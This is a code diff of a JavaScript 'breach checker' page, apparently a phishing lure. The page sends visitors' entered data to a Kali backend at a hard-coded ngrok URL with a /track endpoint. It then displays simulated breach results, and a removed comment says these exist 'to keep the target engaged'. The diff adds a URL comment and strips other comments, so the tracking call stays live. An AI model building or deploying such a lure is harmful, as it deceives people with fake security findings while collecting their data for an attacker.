@@ -1,7 +1,7 @@
 // --- !!! USER: REPLACE THIS WITH YOUR NGROK PUBLIC URL !!! ---
 // Your Ngrok URL will look something like: https://xxxx-xx-xxx-xxx-xx.ngrok-free.app
+// Or the .dev domain: https://xxxx-xx-xxx-xxx-xx.ngrok-free.dev
 const KALI_BACKEND_URL = "https://sporogonial-kizzy-paneless.ngrok-free.dev/track"; 
-// Example: "https://a1b2c3d4e5f6.ngrok-free.app/track";
 // --- !!! ENSURE IT ENDS WITH /track !!! ---
 
 async function checkBreaches() {
@@ -77,13 +77,10 @@ async function checkBreaches() {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify(userData),
-            // 'cors' mode is crucial for cross-origin requests
-            // Flask backend *must* correctly respond with CORS headers for this to work
             mode: 'cors' 
         });
 
         if (!response.ok) {
-            // Log the error to the console for debugging
             const errorText = await response.text();
             console.error(`HTTP error! status: ${response.status}, message: ${errorText}`);
             throw new Error(`HTTP error! status: ${response.status}`);
@@ -92,7 +89,6 @@ async function checkBreaches() {
 
     } catch (error) {
         console.error("Failed to send tracking data to Kali:", error);
-        // Even if sending fails, we can still show a mock breach result to keep the target engaged
     }
 
     // Simulate breach results (for frontend display)
@@ -120,5 +116,5 @@ async function checkBreaches() {
             document.getElementById('resultsTitle').innerText = `✅ Good News! No known breaches for ${email}.`;
             breachDetails.innerHTML = `<p>Our scan indicates that your email address has not been found in publicly disclosed data breaches. Keep up good security practices!</p>`;
         }
-    }, 3000); // Simulate network delay
+    }, 3000); 
 }
